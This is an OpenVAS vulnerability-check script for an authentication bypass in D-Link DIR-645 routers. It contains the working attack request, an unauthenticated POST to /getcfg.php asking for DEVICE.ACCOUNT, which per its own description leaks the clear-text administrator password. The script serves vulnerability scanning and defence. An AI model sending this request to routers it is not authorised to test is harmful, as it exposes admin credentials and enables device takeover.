###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_dir645_auth_bypass_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# D-Link DIR-645 Router Authentication Bypass Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to retrieve the administrator
  password and then access the device with full privileges. This will allow an
  attacker to launch further attacks.
  Impact Level: Application";

tag_affected = "D-Link DIR-645 firmware version prior to 1.03";
tag_insight = "The web interface of D-Link DIR-645 routers expose several pages accessible
  with no authentication. These pages can be abused to access sensitive
  information concerning the device configuration, including the clear-text
  password for the administrative user.";
tag_solution = "Upgrade to D-Link DIR-645 firmware version 1.03 or later,
  For updates refer to http://www.dlink.com/ca/en/home-solutions/connect/routers/dir-645-wireless-n-home-router-1000";
tag_summary = "This host is running D-Link DIR-645 Router and is prone to
  authentication bypass vulnerability.";

if(description)
{
  script_id(803174);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-01 12:01:42 +0530 (Fri, 01 Mar 2013)");
  script_name("D-Link DIR-645 Router Authentication Bypass Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Feb/150");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120591");

  script_description(desc);
  script_summary("Read the content of the configuration file getcfg.php");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = "";
req = "";
res = "";
banner = "";

## Get HTTP Port
port = get_http_port(default:8080);
if(!port){
  port = 8080;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

## Confirm the device from banner
banner = get_http_banner(port: port);
if(banner && "DIR-645" >!< banner){
  exit(0);
}

## Send and Receive the response
req = http_get(item: "/", port:port);
res = http_send_recv(port:port,data:req);

## Confirm the device from response
if(">D-LINK SYSTEMS" >< res &&   ">DIR-645<" >< res)
{
  postdata = "SERVICES=DEVICE.ACCOUNT";

  ## Construct attack request
  req = string("POST /getcfg.php HTTP/1.1\r\n",
               "Host: ", host, ":", port, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postdata), "\r\n",
               "\r\n", postdata);

  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm exploit worked by checking the response
  if(res && ">DEVICE.ACCOUNT<" >< res && "name>DIR-645<" >< res)
  {
    security_warning(port:port);
    exit(0);
  }
}
